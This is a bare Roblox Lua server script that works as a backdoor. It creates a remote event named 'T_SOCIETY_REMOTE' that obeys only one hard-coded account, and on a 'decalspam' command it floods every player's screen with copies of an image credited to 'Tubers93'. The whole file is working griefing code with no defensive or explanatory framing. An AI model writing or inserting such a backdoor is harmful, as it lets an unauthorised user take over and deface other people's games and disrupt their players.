local decalId = "rbxassetid://7447690391" -- Tubers93
local remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
remote.Name = "T_SOCIETY_REMOTE"

remote.OnServerEvent:Connect(function(player, action)
	if player.Name ~= "naberbot98w" then return end

	if action == "decalspam" then
		for _, plr in pairs(game.Players:GetPlayers()) do
			local gui = Instance.new("ScreenGui", plr:WaitForChild("PlayerGui"))
			gui.Name = "DEKAL_SPAM"

			for i = 1, 15 do
				local img = Instance.new("ImageLabel", gui)
				img.Size = UDim2.new(0, math.random(150, 300), 0, math.random(150, 300))
				img.Position = UDim2.new(math.random(), 0, math.random(), 0)
				img.Image = decalId
				img.BackgroundTransparency = 1
			end
		end
	end
end)
